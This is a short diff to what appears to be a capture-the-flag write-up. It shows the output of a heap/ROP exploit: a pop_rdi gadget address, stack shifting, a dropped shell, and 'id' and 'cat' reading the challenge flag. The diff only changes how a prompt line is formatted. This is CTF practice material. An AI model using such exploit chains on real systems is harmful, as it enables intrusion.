@@ -100,7 +100,7 @@ pop_rdi: 0x00007f85a4b41e53
 pop_rdi: [5fc366662e0f1f84]
 Shifting stack...
 Dropping shell...
-> id
+id
 uid=1000(my_chall_pwned) gid=1000(pwned) groups=1000(pwned)
 cat /home/my_chall_pwned/flag
 He4p_H3ap$He4p?H0ur4\o/
